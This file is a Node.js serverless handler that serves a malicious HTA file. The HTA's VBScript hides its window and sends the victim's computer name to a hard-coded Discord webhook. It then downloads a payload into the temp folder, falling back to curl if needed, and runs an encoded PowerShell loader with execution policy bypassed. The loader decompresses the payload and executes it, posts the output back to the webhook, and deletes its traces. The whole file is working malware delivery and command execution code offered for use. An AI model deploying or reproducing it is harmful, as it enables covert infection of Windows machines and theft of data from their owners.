const WH = 'https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K';

const LOADER = "$f=\"$env:TEMP\\p.txt\";$t=[IO.File]::ReadAllText($f);"
  + "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String($t));"
  + "$d=New-Object IO.Compression.DeflateStream($s,[IO.Compression.CompressionMode]::Decompress);"
  + "$o=New-Object IO.MemoryStream;$d.CopyTo($o);"
  + "&([scriptblock]::Create([Text.Encoding]::UTF8.GetString($o.ToArray())))";

module.exports = (req, res) => {
  try {
    const proto = req.headers['x-forwarded-proto'] || 'https';
    const base = proto + '://' + req.headers.host;
    const enc = Buffer.from(LOADER, 'utf16le').toString('base64');

    const hta = String.raw`<html><head><title>v</title>
<HTA:APPLICATION ID="x" SHOWINTASKBAR="no" CAPTION="no" WINDOWSTATE="minimize" SINGLEINSTANCE="yes"/>
</head><body><script language="VBScript">
Dim sh, rc, ex, so, se, p, u, h, st, i
Sub P(m)
  On Error Resume Next
  Dim q
  Set q = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  q.Open "POST", "${WH}?wait=true", False
  q.setRequestHeader "Content-Type", "application/json"
  q.Send "{""content"":""" & Replace(m, """", "'") & """}"
End Sub
On Error Resume Next
Set sh = CreateObject("WScript.Shell")
P "hta : " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
p = sh.ExpandEnvironmentStrings("%TEMP%") & "\p.txt"
u = "${base}/a?_=" & Timer
For i = 1 To 3
  On Error Resume Next
  Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  h.Open "GET", u, False
  h.Send
  If Err.Number = 0 And h.Status = 200 Then
    Set st = CreateObject("ADODB.Stream")
    st.Type = 1
    st.Open
    st.Write h.responseBody
    st.SaveToFile p, 2
    st.Close
    Exit For
  End If
  P "dl retry : " & Err.Number & " | " & h.Status
  Err.Clear
Next
If i > 3 Then
  sh.Run "cmd /c curl.exe -s -o """ & p & """ """ & u & """", 0, True
End If
On Error Resume Next
Set ex = sh.Exec("C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -nop -ni -w h -ep bypass -enc ${enc}")
If Err.Number <> 0 Then
  P "exec err : " & Err.Number & " | " & Err.Description
Else
  Do While ex.Status = 0
    sh.Sleep 150
  Loop
  P "exit : " & ex.ExitCode
  se = ex.StdErr.ReadAll()
  so = ex.StdOut.ReadAll()
  If Len(se) > 0 Then P "stderr : " & Left(se, 1200)
  If Len(so) > 0 Then P "stdout : " & Left(so, 1200)
End If
On Error Resume Next
CreateObject("Scripting.FileSystemObject").DeleteFile p
window.close
</script></body></html>`;

    res.setHeader('Content-Type', 'application/hta');
    res.setHeader('Cache-Control', 'no-store, max-age=0');
    res.status(200).send(hta);
  } catch (e) {
    res.status(500).send('ERR ' + e.message + '\n' + e.stack);
  }
};
